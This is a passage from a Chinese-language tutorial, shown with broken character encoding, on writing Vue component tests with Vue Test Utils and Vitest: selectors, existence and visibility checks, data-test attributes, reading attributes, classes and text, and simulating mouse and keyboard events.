åœ¨æ–¼ find åœ¨æ‰¾ä¸åˆ°çš„æƒ…æ³ä¸‹ç›®æ¨™çš„æƒ…æ³æ‰€è¿”å›çš„å€¼æœƒæ˜¯ ErrorWrapper ç‰©ä»¶ï¼Œæ‰€ä»¥é€é toBeTruthy æ–·è¨€å°±æœƒé€šéã€‚\nè€Œç‚ºäº†é¿å…é€™ç¨®æƒ…æ³ç™¼ç”Ÿï¼Œå®˜æ–¹æ–‡ä»¶å…¶å¯¦åªæœ‰è¼•ææ·¡è¿°åœ°èªªé“ï¼š\nAs a rule of thumb, always use get except when you are asserting something doesn\u0026rsquo;t exist. In that case use find.\nä½†ä¸Šæ–¹ç¶“é©—è€ƒé‡åœ¨å“ªï¼Œåªæœ‰åœ¨è¿½äº†ä»–å€‘ç›¸é—œçš„ issue æ‰æœƒé€æ¼¸æ˜ç™½è€ƒé‡çš„æ ¹æ“šï¼Œè€Œé—œæ–¼é€™éƒ¨åˆ†ï¼Œç”šè‡³é–‹ç™¼åœ˜éšŠæœªä¾†å¯èƒ½ä¹Ÿæœƒè€ƒæ…®å°‡ find æ–¹æ³•çµ¦æ‹”æ‰ï¼Œå‰©ä¸‹ exists æœ¬èº«ï¼Œä½†ç¤™æ–¼é€™æœƒæ˜¯å€‹ breaking change çš„åšæ³•ï¼Œæ‰€ä»¥åœ¨ vue-test-utils è·³å¤§ç‰ˆæœ¬è™Ÿä¹‹å‰æ‡‰è©²éƒ½æœƒæš«æ™‚ç¶­æŒåŸæ¨£ã€‚\nå…ƒä»¶ï¼ˆcomponentï¼‰é¸æ“‡å™¨ findComponent findAllfindComponents (æ³¨æ„æœ‰å€‹ sï¼‰ getComponent åŸå‰‡ä¸Šä½¿ç”¨æ–¹å¼èˆ‡å…ƒç´ é¸æ“‡å™¨å·®ä¸å¤šï¼Œåªæ˜¯é¸å–èªæ³•ä¸Šé™¤äº† refs èˆ‡ querySelector èªæ³•ä¹‹å¤–ï¼Œé‚„å¤šäº†ï¼š\nComponent nameï¼š findComponent({name: 'å…ƒä»¶åç¨±'}) å°‡ import SFC ç›´æ¥æ”¾å…¥æ–¹æ³•ä¸­ï¼š findComponent(Component) ä½†ç”±æ–¼ä½¿ç”¨ querySelector ä¸Šä¹Ÿæœ‰ä¸€äº›å°é™·é˜±ï¼Œæ‰€ä»¥å€‹äººå»ºè­°ä»¥ SFC æ–¹å¼å¼•å…¥æˆ–æ˜¯ä¹¾è„†é€é shallowMount å°‡å­å±¤å…ƒä»¶ stub æ‰ä¹Ÿæ˜¯ä¸€ç¨®æ–¹å¼ã€‚\nåˆ¤æ–·ç›®æ¨™å­˜åœ¨ ç¶“ç”±å‰›å‰›é™·é˜±çš„éƒ¨åˆ†å¤§å®¶æ‡‰è©²éƒ½å¾ˆæ¸…æ¥š exists() çš„å­˜åœ¨äº†ï¼Œè€Œåˆ¤æ–·é¸å–ç›®æ¨™å…¶å¯¦ä»–é‚„æœ‰å€‹å¥½æœ‹å‹å°±æ˜¯ isVisible()ï¼Œä½†ä»–å€‘åˆ¤æ–·å­˜åœ¨çš„å®šç¾©ä¸Šæœ‰ä¸€äº›å·®åˆ¥ï¼š\nexists()ï¼šä¸»è¦åˆ¤æ–·çš„æ˜¯è©²ç›®æ¨™å­˜ä¸å­˜åœ¨ DOM ä¸Šï¼š 1 \u0026lt;p\u0026gt;Hello\u0026lt;/p\u0026gt; 1 2 3 4 5 it(exist, () =\u0026gt; { const wrapper = mount(Component) expect(wrapper.find(\u0026#39;p\u0026#39;).exists()).toBe(true) expect(wrapper.find(\u0026#39;span\u0026#39;).exists()).toBe(false) }) isVisable()ï¼šä¸»è¦åˆ¤æ–·çš„æ˜¯è©²ç›®æ¨™å­˜åœ¨ DOM ä¸Šä¹‹å¤–ï¼Œè¦–è¦ºä¸Šæœ‰ç„¡é¡¯ç¤ºåœ¨ç•«é¢ä¸­ï¼š 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;p v-if=\u0026#34;false\u0026#34; class=\u0026#34;dog\u0026#34;\u0026gt;ç§‘åŸº\u0026lt;/p\u0026gt; \u0026lt;p v-show=\u0026#34;true\u0026#34; class=\u0026#34;orange-cat\u0026#34;\u0026gt;æ©˜è²“\u0026lt;/p\u0026gt; \u0026lt;p v-show=\u0026#34;false\u0026#34; class=\u0026#34;black-cat\u0026#34;\u0026gt;é»‘é»‘\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 it(\u0026#39;v-if false\u0026#39;, () =\u0026gt; { const wrapper = mount(component) expect(wrapper.find(\u0026#39;.dog\u0026#39;).isVisible()).toBeFalsy() // Errorï¼š ç›´æ¥å™´éŒ¯ }) it(\u0026#39;v-show true\u0026#39;, () =\u0026gt; { const wrapper = mount(component) expect(wrapper.find(\u0026#39;.orange-cat\u0026#39;).isVisible()).toBeTruthy() // æ¸¬è©¦é€šé }) it(\u0026#39;v-show false\u0026#39;, () =\u0026gt; { const wrapper = mount(component) expect(wrapper.find(\u0026#39;.black-cat\u0026#39;).isVisible()).toBeFalsy() // æ¸¬è©¦é€šé }) é—œæ–¼ isVibile æ›´ç‚ºè©³ç´°çš„åˆ¤æ–·å¦‚ä¸‹ï¼š\nCSS style ä¸­ å«æœ‰ display: none =\u0026gt; false CSS style ä¸­ å«æœ‰ visibility: hidden =\u0026gt; false CSS style ä¸­ å«æœ‰ opacity :0 =\u0026gt; false å…ƒç´ ä¸­ hidden å±¬æ€§ç‚º true =\u0026gt; false ç¶œåˆçµè«–ä¸Šæ–¹é™·é˜±èˆ‡åˆ¤æ–·æ–¹æ³•ï¼š\nè‹¥è¦åˆ¤æ–·å…ƒç´ æ˜¯å¦å­˜åœ¨ æˆ– v-ifï¼šä½¿ç”¨ get æ–¹æ³•æ˜¯æœ€ä¿éšªçš„ï¼ŒçœŸçš„è¦ç”¨ find å‰‡ä¸€å®šè¦æ­é… exists è‹¥è¦åˆ¤æ–· v-showï¼šä½¿ç”¨ find().isVisible() ä½¿ç”¨ data-* attribute åœ¨æ’°å¯«æ¸¬è©¦æƒ…å¢ƒæ™‚ï¼Œè‹¥ä¾ç…§ä¸Šé¢çš„ querySelector é¸äº†å…ƒç´ ã€id æˆ– class æ™‚ï¼ŒåˆæœŸä¸€å®šæœƒå¾ˆé–‹å¿ƒï¼Œå› ç‚ºä¸æœƒé‡åˆ°å¤ªå¤šå›°é›£ï¼Œä½†å¾€å¾Œåœ¨é–‹ç™¼çš„éç¨‹åŸ·è¡Œæ¸¬è©¦æ™‚å°±å¾ˆå®¹æ˜“æœ‰æ©Ÿæœƒé‡åˆ°å„ç¨®å•é¡Œã€‚\nåŸå…ˆï¼š\n1 2 3 \u0026lt;template\u0026gt; \u0026lt;p class=\u0026#34;content\u0026#34;\u0026gt;content\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; æ”¹æˆï¼š\n1 2 3 \u0026lt;template\u0026gt; \u0026lt;p class=\u0026#34;content\u0026#34; data-test=\u0026#34;content\u0026#34;\u0026gt;content\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; ä½¿ç”¨ data-* ä½œç‚ºé¸æ“‡ç›®æ¨™å¥½è™•æœ€ä¸»è¦åœ¨æ–¼é¡¯è‘—æ¨™è¨˜æ¸¬è©¦å…§å®¹ï¼Œè€Œé€™å½±éŸ¿åˆ°çš„ç¯„åœæœ‰ï¼š\né–‹ç™¼æœŸï¼Œéç¨‹ä¸ç”¨æ“”å¿ƒæœƒå½±éŸ¿åˆ°æ¸¬è©¦ï¼Œå¦‚ä¸Šæ–¹æ‰€è¦‹ï¼Œæˆ‘åªè¦è®Šæ›´ data-test ä»¥å¤–çš„å…§å®¹ï¼Œé æœŸæ‡‰è©²ä¸æœƒå½±éŸ¿åˆ°æ¸¬è©¦é¸æ“‡çš„ç›®æ¨™ï¼Œä½¿æ¸¬è©¦æ¡ˆä¾‹éŒ¯èª¤èƒ½æ›´å°ˆæ³¨åœ¨æ–·è¨€çš„ç›®æ¨™ä¸Šï¼Œè€Œéé¸æ“‡ç›®æ¨™è¢«æ›¿æ›å°è‡´çš„éŒ¯èª¤ã€‚ é‡æ§‹ï¼ˆrefactorï¼‰éç¨‹ï¼Œèƒ½æ¸…æ¥šæ¯”è¼ƒç¯„åœï¼Œè‹¥å°‡ä¾†èª¿æ•´çµæ§‹ï¼Œåªè¦å°‡å±¬æ€§è½‰ç§»åˆ°å°æ‡‰çš„ä½ç½®å³å¯ã€‚ ç”Ÿç”¢æœŸï¼Œèƒ½å¤ é‡å°ç‰¹å®šçš„å±¬æ€§ç§»é™¤ï¼Œé¿å…ç•™ä¸‹å„ç¨®æ¸¬è©¦ç—•è·¡ï¼Œå°æ–¼åƒæ˜¯è¼”åŠ©é–±è®€è£ç½®ç­‰æŠ€è¡“ä¾†èªªå°±ä¸æœƒè¢«å½±éŸ¿åˆ°ã€‚ åœ¨ç”Ÿç”¢ç’°å¢ƒåˆªé™¤ data-* attribute è‹¥æƒ³åœ¨ vitest ä¸­ç§»é™¤ data-* ä¹Ÿéå¸¸çš„ç°¡å–®ï¼Œæˆ‘å€‘åªéœ€è¦åœ¨ vite.config.js è¨­å®šä¸­ï¼Œé‡å° Vue åº•ä¸‹çš„ç·¨è­¯é¸é …åšä¸€äº›èª¿æ•´å³å¯ï¼ˆåº•ä¸‹ç¤ºç¯„çš„ç‰ˆæœ¬ç‚ºç§»é™¤ data-testï¼Œè‹¥ä½¿ç”¨å…¶ä»–å‘½åè«‹è‡ªè¡Œèª¿æ•´å›‰ï¼‰ï¼š\nvite.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 const isProd = process.env.NODE_ENV === \u0026#39;production\u0026#39; const removeDataTestAttrs = (node) =\u0026gt; { const NodeTypes = Object.freeze({ ELEMENT: 1, ATTRIBUTE: 6, }) if (node.type === NodeTypes[\u0026#39;ELEMENT\u0026#39;]) { node.props = node.props.filter((prop) =\u0026gt; (prop.type === NodeTypes[\u0026#39;ATTRIBUTE\u0026#39;] ? prop.name !== \u0026#39;data-test\u0026#39; : true)) // è«‹è‡ªè¡Œæ›¿æ›å‘½å data-test } } export default defineConfig(() =\u0026gt; { return { plugins: [ vue({ template: { compilerOptions: { nodeTransforms: isProd ? [removeDataTestAttrs] : [], }, }, }), ] } }) å®¹å™¨çš„æ–¹æ³•(Wrapper methods) - å–å¾—ç›®æ¨™è³‡è¨Š åˆ¤æ–·å±¬æ€§ attributes ç•¶ä½ æƒ³è¦ç¢ºèª \u0026lt;a\u0026gt; ä¸­çš„ href æ˜¯å¦å¸¶æœ‰æŒ‡å®šçš„é€£çµæˆ–æ˜¯æª¢æŸ¥ \u0026lt;img\u0026gt; ä¸Šçš„å±¬æ€§æ™‚ï¼Œé€™æ™‚å°±å¯ä»¥é€é attributes å–å¾—å±¬æ€§ã€‚\nè€Œ attributes ç”¨æ³•ä¸»è¦æœ‰å…©ç¨®ï¼Œç›´æ¥ä½¿ç”¨æ™‚æœƒç²å–ç›®æ¨™ï¼š\n1 \u0026lt;a data-test=\u0026#34;link\u0026#34; href=\u0026#34;https://ithelp.ithome.com.tw/\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;ithelp\u0026lt;/a\u0026gt; 1 wrapper.find(\u0026#39;[data-test=\u0026#34;link\u0026#34;]\u0026#39;).attributes() // { href: \u0026#39;https://ithelp.ithome.com.tw/\u0026#39;, \u0026#39;target\u0026#39;: \u0026#39;_blank\u0026#39; } ç•¶æƒ³è¦ç›´æ¥å–å¾—ç‰¹å®šå±¬æ€§å€¼æ™‚ä¹Ÿå¯ä»¥ç›´æ¥å°‡å±¬æ€§åç¨±å¸¶å…¥åƒæ•¸ä¸­ï¼š\n1 wrapper.find(\u0026#39;a\u0026#39;).attributes(\u0026#39;target\u0026#39;) // \u0026#39;_blank\u0026#39; classes åŒæ¨£çš„ï¼Œè‹¥æƒ³è¦å°‹æ‰¾ class å±¬æ€§çš„è©±å¯ä»¥é€é classes èªæ³•å–å¾—è³‡è¨Šã€‚ä½ å¯èƒ½æœƒç›´è¦ºåœ°æƒ³åˆ° class ä¹Ÿæ˜¯å±¬æ€§çš„ä¸€ç¨®é‚£æ‡‰è©²ç”¨ attributes('class') æŸ¥è©¢ï¼Œç„¶è€Œé€™å…©è€…çš„å·®åˆ¥æœ€ä¸»è¦åœ¨æ–¼ç”¢å‡ºçš„çµæœæœƒæœ‰æ‰€ä¸åŒã€‚\n1 2 3 \u0026lt;section data-test=\u0026#34;wrap\u0026#34; class=\u0026#34;container w-full h-full\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Title\u0026lt;/p\u0026gt; \u0026lt;/section\u0026gt; è‹¥ä½¿ç”¨ attributes('class') æŸ¥è©¢çµæœå°‡æœƒæ˜¯å­—ä¸²å½¢å¼çš„è³‡æ–™ï¼Œå¾ŒçºŒè¦è™•ç†æ¯”å°ä¸Šçš„å•é¡Œæœƒç¨å¾®éº»ç…©ä¸€é»ï¼š\n1 wrapper.find(\u0026#39;[data-test=\u0026#34;wrap\u0026#34;]\u0026#39;).attributes(\u0026#39;class\u0026#39;) // \u0026#34;container w-full h-full\u0026#34; è‹¥æ˜¯ä½¿ç”¨ classes èªæ³•æŸ¥è©¢çš„è©±å°‡å¾—åˆ°ä¸€å€‹é™£åˆ—çš„çµæœï¼š\n1 wrapper.find(\u0026#39;[data-test=\u0026#34;wrap\u0026#34;]\u0026#39;).classes() // [\u0026#34;container\u0026#34;, \u0026#34;w-full\u0026#34;, \u0026#34;h-full\u0026#34;] æ­¤æ™‚å°±å¯ä»¥é…åˆ toContain ç­‰é™£åˆ—çš„æ–·è¨€ Matcher å¿«é€Ÿè™•ç†æ¸¬è©¦æ¡ˆä¾‹ï¼š\n1 expect(wrapper.find(\u0026#39;[data-test=\u0026#34;wrap\u0026#34;]\u0026#39;).classes()).toContain(\u0026#39;container\u0026#39;) é€™å°æ–¼æ¸¬è©¦æ¨£å¼æ¡ç”¨åŸå­åŒ–è¨­è¨ˆçš„å·¥å…·ï¼ˆTailwind CSSã€Windi CSS ç­‰ï¼‰æœ‰å¥‡æ•ˆï¼Œæˆ‘å€‘å¯ä»¥å°‡è¦–è¦ºå±¤çš„é‚è¼¯é€é classes çš„çµæœæ–·è¨€ã€‚\nå› ç‚ºé€™é¡åŸå­åŒ–è¨­è¨ˆå·¥å…·å¾€å¾€ä¾è³´ class å±¬æ€§ä¾†åšæ¨£å¼ä¸Šçš„èª¿æ•´èˆ‡æ“´å……ï¼Œé€šå¸¸ç‚ºäº†ç¾è§€èˆ‡ç®¡ç†æ–¹ä¾¿æœƒé †ä¾¿åœ¨ä½¿ç”¨é€™é¡å·¥å…·æ™‚åŠ è£è‡ªå‹•æ’åºï¼ˆsortingï¼‰ class å±¬æ€§ç­‰æ“´å……å·¥å…·ï¼Œå› æ­¤ class çš„é †åºå°‡è®Šæˆä¸ç©©å®šçš„ç‹€æ…‹ã€‚\nå› æ­¤å…ƒç´ è‹¥å¾ï¼š\n1 \u0026lt;p data-test=\u0026#34;content\u0026#34; class=\u0026#34;A B C\u0026#34;\u0026gt;content\u0026lt;/p\u0026gt; è®Šæˆï¼š\n1 \u0026lt;p data-test=\u0026#34;content\u0026#34; class=\u0026#34;A C B\u0026#34;\u0026gt;content\u0026lt;/p\u0026gt; å°æ–¼å¿«ç…§æ¸¬è©¦ç­‰ Matcher (toMatchSnapshotã€toMatchInlineSnapshot)ä¾†èªªå°‡æœƒé¡¯ç¤ºæ¸¬è©¦å¤±æ•—ï¼š\n1 expect(wrapper.find(\u0026#39;.content\u0026#39;)).toMatchSnapshot() å¿«ç…§æ¯”å°çµæœï¼š\n1 2 - class=\u0026#34;A B C\u0026#34; + class=\u0026#34;A C B\u0026#34; è€Œä»¥é™£åˆ—æ¯”å°æ˜¯å¦ã€ŒåŒ…å«ã€çš„æ–¹å¼ï¼Œå°‡ä¸å—å½±éŸ¿ï¼š\n1 2 3 expect(wrapper.find(\u0026#39;.content\u0026#39;).classes()).toContain(\u0026#39;A\u0026#39;) expect(wrapper.find(\u0026#39;.content\u0026#39;).classes()).toContain(\u0026#39;B\u0026#39;) expect(wrapper.find(\u0026#39;.content\u0026#39;).classes()).toContain(\u0026#39;C\u0026#39;) åˆ¤æ–·å…§å®¹ç‰© text text ä¸»è¦æ˜¯å–å¾—ç›®æ¨™å…ƒç´ ç¯€é»å¾Œä»£çš„æ‰€æœ‰æ–‡å­—ï¼š\nRootComponent.vue 1 2 3 4 5 6 \u0026lt;div data-test=\u0026#34;target\u0026#34;\u0026gt; Root \u0026lt;child-component /\u0026gt; \u0026lt;child-component /\u0026gt; \u0026lt;child-component /\u0026gt; \u0026lt;/div\u0026gt; ChildComponent.vue 1 \u0026lt;p\u0026gt;child\u0026lt;/p\u0026gt; ä½¿ç”¨ mount åŒ…è£å…ƒä»¶æ™‚ wrapper.find('[data-test=\u0026quot;target\u0026quot;]').text() çš„çµæœå°‡æœƒæ˜¯ï¼š\n1 Rootchildchildchild ä½¿ç”¨ shallowMount åŒ…è£å…ƒä»¶æ™‚ wrapper.find('[data-test=\u0026quot;target\u0026quot;]').text() çš„çµæœå°‡æœƒæ˜¯ï¼š\n1 Root html èˆ‡ text é¡ä¼¼ï¼Œä½† html æœƒå°‡ç›®æ¨™å…ƒç´ å¾Œä»£æ‰€æœ‰å…ƒç´ éƒ½è¨˜éŒ„ä¸‹ä¾†ï¼š\nRootComponent.vue 1 2 3 4 5 6 \u0026lt;div data-test=\u0026#34;target\u0026#34;\u0026gt; Root \u0026lt;child-component /\u0026gt; \u0026lt;child-component /\u0026gt; \u0026lt;child-component /\u0026gt; \u0026lt;/div\u0026gt; ChildComponent.vue 1 \u0026lt;p\u0026gt;child\u0026lt;/p\u0026gt; ä½¿ç”¨ mount åŒ…è£å…ƒä»¶æ™‚ wrapper.find('[data-test=\u0026quot;target\u0026quot;]').html() çš„çµæœå°‡æœƒæ˜¯ï¼š\n1 2 3 4 Root \u0026lt;p\u0026gt;child\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;child\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;child\u0026lt;/p\u0026gt; ä½¿ç”¨ shallowMount åŒ…è£å…ƒä»¶æ™‚ wrapper.find('[data-test=\u0026quot;target\u0026quot;]').html() çš„çµæœå°‡æœƒæ˜¯ï¼š\n1 2 3 4 Root \u0026lt;child-component-stub\u0026gt;\u0026lt;/child-component-stub\u0026gt; \u0026lt;child-component-stub\u0026gt;\u0026lt;/child-component-stub\u0026gt; \u0026lt;child-component-stub\u0026gt;\u0026lt;/child-component-stub\u0026gt; å› æ­¤åœ¨ä½¿ç”¨ text èˆ‡ html ä¾†é€²è¡Œæ–·è¨€æ™‚ï¼Œè¦æ³¨æ„åˆ°ã€Œæ¸¬è©¦æ‰€éœ€åŒ…å«çš„ç¯„åœã€ä»¥åŠã€Œå…ƒä»¶å®¹å™¨ã€æ‡‰æ¡ç”¨ mount é‚„æ˜¯ shallowMount ç­‰è­°é¡Œï¼Œæ‰èƒ½è®“æ¸¬è©¦æ›´åŠ å¼·éŸŒä¸”ä¸æœƒè®“å¾ŒçºŒé–‹ç™¼ç„¡ç›¸é—œçš„å…§å®¹æ™‚ä¸€ç›´è¢«æ¸¬è©¦æ””ä½ã€‚\nå®¹å™¨çš„æ–¹æ³•(Wrapper methods) - æ¨¡æ“¬äº‹ä»¶ æ»‘é¼ äº‹ä»¶ å¸¸è¦‹çš„ DOM äº‹ä»¶æœ‰ä¸‹åˆ—å¹¾ç¨®ï¼š\næ»‘é¼ äº‹ä»¶ï¼šé»æ“Šï¼ˆclickï¼‰ éµç›¤äº‹ä»¶ï¼šæŒ‰ä¸‹æŸéµï¼ˆkeydownï¼‰ã€é¬†é–‹æŸéµï¼ˆkeyupï¼‰ è¡¨å–®äº‹ä»¶ï¼šé‡å° \u0026lt;input\u0026gt; è¼¸å…¥å…§å®¹ã€checkbox èˆ‡ radio å‹¾é¸æˆ– \u0026lt;select\u0026gt; ä¸­çš„é¸æ“‡å…§å®¹ é¦–å…ˆï¼Œèªæ³•æ–¹é¢é™¤äº†è¡¨å–®äº‹ä»¶ä¹‹å¤–ï¼Œè¦æ¨¡æ“¬å¤§éƒ¨åˆ†çš„äº‹ä»¶æˆ‘å€‘å¯ä»¥é€éå®¹å™¨æ–¹æ³•ä¸­çš„ trigger æ–¹æ³•å³å¯è§¸ç™¼äº‹ä»¶ï¼š\n1 wrapper.trigger(event, options) ç”¨æ³•æ˜¯åœ¨ç¬¬ä¸€å€‹åƒæ•¸ä¸­å‚³å…¥è¦è§¸ç™¼çš„ DOM äº‹ä»¶åç¨±ï¼ˆe.g. clickã€dragï¼‰ï¼Œå¦‚æœæœ‰éœ€è¦è£œå……è§¸ç™¼äº‹ä»¶çš„æ¢ä»¶ï¼Œæ¯”æ–¹åƒæ˜¯æŒ‰ä¸‹å“ªå€‹éµç›¤ï¼Œå°±å¯ä»¥é€éç¬¬äºŒå€‹åƒæ•¸å¸¶å…¥è³‡è¨Šï¼ˆe.g. { keyCode: 65 }ï¼‰ã€‚\nè€Œè¦æ³¨æ„åˆ°çš„æ˜¯ç”±æ–¼é€™äº›äº‹ä»¶åŸºæœ¬ä¸Šéƒ½æœƒæ˜¯éåŒæ­¥çš„ç”¨æ³•ï¼Œæ‰€ä»¥åœ¨æ’°å¯«æ¸¬è©¦æ¡ˆä¾‹æ™‚å¯ä»¥ä½¿ç”¨ async/await ä¾†è®“æ–·è¨€ï¼ˆAssertionï¼‰ä¿æŒæ­£ç¢ºçš„çµæœï¼š\n1 2 3 4 5 6 7 8 9 10 it(\u0026#39;...\u0026#39;, async () =\u0026gt; { // Arrange const wrapper = mount(component) // Act await wrapper.trigger(event, options) // Assert expect(/* ... */).toBe(/* ... */) }) æœ‰äº†é€™å€‹æ¦‚å¿µä¹‹å¾Œï¼Œæ¥ä¸‹ä¾†ä¾¿å¯ä»¥å¿«é€Ÿä¾†çœ‹çœ‹å¯¦éš›ä¸Šå„å€‹äº‹ä»¶è§¸ç™¼çš„å¯¦éš›æ¡ˆä¾‹èˆ‡äº‹ä»¶åç¨±ï¼Œä¸¦ä¸”è‘—é‡é—œæ³¨è¦ç‰¹åˆ¥æ³¨æ„çš„åœ°æ–¹ã€‚\næ»‘é¼ äº‹ä»¶ é»æ“Šï¼š click é›™æ“Šï¼š dblclick æŒ‡å®šé»æ“Šï¼š click.leftã€click.middleã€click.right é»æ“Šèˆ‡é›™æ“Š é»æ“Šèˆ‡é›™æ“Šçš„éƒ¨åˆ†æœ€ä¸»è¦éœ€è¦æ³¨æ„çš„éƒ¨åˆ†æ˜¯ï¼Œä»¥äº‹ä»¶ä¾†èªªçš„æ¦‚å¿µã€Œé›™æ“Šï¼ˆdblclickï¼‰ã€æ˜¯ä¸€å€‹äº‹ä»¶ï¼Œä¸¦éã€Œå…©å€‹ã€ã€Œé»æ“Šï¼ˆclickï¼‰ã€äº‹ä»¶ï¼š\nå…ƒä»¶ 1 2 3 4 5 6 7 8 \u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; const count = ref(0) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;p data-test=\u0026#34;content\u0026#34;\u0026gt;{{ count }}\u0026lt;/p\u0026gt; \u0026lt;button data-test=\u0026#34;button\u0026#34; @click=\u0026#34;count++\u0026#34;\u0026gt;Add\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; æ¸¬è©¦ç¨‹å¼ç¢¼ 1 2 3 4 5 6 7 8 9 10 it(\u0026#39;after click button should display correct content\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.find(\u0026#39;[data-test=\u0026#34;button\u0026#34;]\u0026#39;).trigger(\u0026#39;click\u0026#39;) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;content\u0026#34;]\u0026#39;).text()).toBe(\u0026#39;1\u0026#39;) await wrapper.find(\u0026#39;[data-test=\u0026#34;button\u0026#34;]\u0026#39;).trigger(\u0026#39;click\u0026#39;) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;content\u0026#34;]\u0026#39;).text()).toBe(\u0026#39;2\u0026#39;) await wrapper.find(\u0026#39;[data-test=\u0026#34;button\u0026#34;]\u0026#39;).trigger(\u0026#39;dblclick\u0026#39;) // è§¸ç™¼ä¸åˆ° @click äº‹ä»¶ expect(wrapper.find(\u0026#39;[data-test=\u0026#34;content\u0026#34;]\u0026#39;).text()).toBe(\u0026#39;4\u0026#39;) // AssertionError }) æŒ‡å®šæŒ‰éµé»æ“Š æœ‰æ™‚å€™ä½ å¯ä»¥æœƒæƒ³è¦æŒ‡å®šæ»‘é¼ çš„æŒ‰éµä¾†è§¸ç™¼äº‹ä»¶ï¼Œé€™æ™‚å°±å¯ä»¥ä½¿ç”¨é¡ä¼¼ä¿®é£¾ç¬¦ï¼ˆmodifierï¼‰ä¸€æ¨£çš„æ–¹å¼ä¾†è§¸ç™¼äº‹ä»¶ï¼š\nclick.left click.middle click.right å…ƒä»¶ 1 2 3 4 5 6 7 8 \u0026lt;script\u0026gt; const result = ref(\u0026#39;\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;button data-test=\u0026#34;button\u0026#34; @click.right=\u0026#34;result = \u0026#39;here we go!\u0026#39;\u0026#34;\u0026gt;Are You ready?\u0026lt;/button\u0026gt; \u0026lt;p data-test=\u0026#34;target\u0026#34;\u0026gt;{{ result }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; æ¸¬è©¦ç¨‹å¼ç¢¼ 1 2 3 4 5 it(\u0026#39;should be display correct text\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.find(\u0026#39;[data-test=\u0026#34;button\u0026#34;]\u0026#39;).trigger(\u0026#39;click.right\u0026#39;) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toBe(\u0026#39;here we go!\u0026#39;) }) é™¤æ­¤ä¹‹å¤–ï¼Œéµç›¤èˆ‡æ»‘é¼ çš„æ“ä½œä¹Ÿå¯ä»¥èåˆå†ä¸€èµ·ï¼š\n1 2 trigger(\u0026#39;click.ctrl.left\u0026#39;) // å·¦éµé»æ“Šæ™‚åŒæ™‚æŒ‰è‘— ctrl éµ trigger(\u0026#39;click.alt.right\u0026#39;) // å³éµé»æ“Šæ™‚åŒæ™‚æŒ‰è‘— alt éµ éµç›¤äº‹ä»¶ éµç›¤æœ€å¸¸è¦‹çš„æ ¸å¿ƒäº‹ä»¶ä¸»è¦ç‚ºï¼š\næŒ‰ä¸‹æŸå€‹æŒ‰éˆ• keydown é¬†é–‹æŸå€‹æŒ‰éˆ• keyup ä¸Šè¿°äº‹ä»¶å¦‚åŒæŒ‡å®šæ»‘é¼ æŒ‰éµçš„å¯«æ³•ï¼Œä¸€æ¨£æ“æœ‰ä¿®é£¾ç¬¦çš„ç›¸é—œèªæ³•ï¼Œè€Œå¾Œæ–¹å¸¶çš„ä¿®é£¾ç¬¦ä¸»è¦ç‚ºæŒ‰éµçš„åç¨±ï¼š\n1 2 trigger(\u0026#39;keydown.enter\u0026#39;) // æŒ‰ä¸‹ enter éµ trigger(\u0026#39;keyup.up\u0026#39;) // é¬†é–‹ ä¸Šæ–¹å‘éµ åŒæ¨£åœ°ï¼Œéµç›¤äº‹ä»¶ä¹Ÿæ”¯æ´å¤šé‡çš„çµ„åˆä¿®é£¾ç¬¦å¯«æ³•ï¼š\n1 trigger(\u0026#39;keydown.ctrl.tab\u0026#39;) // æŒ‰ä¸‹ ctrl éµ + tab éµ è‹¥ä½ æƒ³è¦æ›´éˆæ´»çš„ä½¿ç”¨éµç›¤äº‹ä»¶ï¼Œä¹Ÿå¯ä»¥ç”¨ trigger æ–¹æ³•çš„ç¬¬äºŒå€‹åƒæ•¸å¸¶å…¥éµç›¤çš„åç¨±ï¼Œè€Œç›®å‰æœ‰æ”¯æ´çš„å¯«æ³•ä¸»è¦æœ‰ä¸‹åˆ—ä¸‰ç¨®ï¼š\n1 2 3 4 5 trigger(\u0026#39;äº‹ä»¶åç¨±\u0026#39;, { code?: event.code; key?: event.key; keyCode?: event.keycode; }) è‹¥ä¸æ¸…æ¥šéµç›¤å°æ‡‰çš„ä»£è™Ÿä¹Ÿæ²’æœ‰é—œä¿‚ï¼Œæœ‰ä¸å°‘ç¶²ç«™å°ˆé–€æä¾›é¡ä¼¼çš„æœå‹™ä¾›æŸ¥è©¢ï¼Œæ¯”æ–¹åƒé€™å€‹ ç¶²ç«™ åªè¦æŒ‰ä¸‹ä»»ä¸€æŒ‰éµå°±æœƒå³æ™‚é¡¯ç¤ºéµç›¤å°æ‡‰çš„ä»£è™Ÿã€åç¨±ç­‰ç­‰ç›¸é—œè³‡è¨Šã€‚\nåœ¨æŸ¥åˆ°ä»£è™Ÿå¾Œæˆ‘å€‘å°±å¯ä»¥å°‡å…¶å¸¶å…¥å‰›æ‰çš„æ–¹æ³•ä¸­ï¼š\n1 trigger(\u0026#39;keydown\u0026#39;, { keyCode: 13 }) è‡³æ–¼è¦é¸æ“‡å“ªç¨®å¯«æ³•å°±çœ‹å ´æ™¯æœ¬èº«çš„éœ€æ±‚ä¾†åšæ±ºå®šå›‰ï¼\nè¡¨å–®äº‹ä»¶ input è¼¸å…¥ checkbox / radio å‹¾é¸ \u0026lt;select\u0026gt; ä¸­çš„é¸æ“‡å…§å®¹ åŸå…ˆç‚ºäº†é‡å°ä¸åŒè¡¨å–®é¡å‹ï¼ŒVue Test Utils 1 ç‰ˆï¼ˆfor Vue2ï¼‰å·¥å…·æä¾›äº†ä¸€å€‹å°ˆå±¬çš„ setChecked 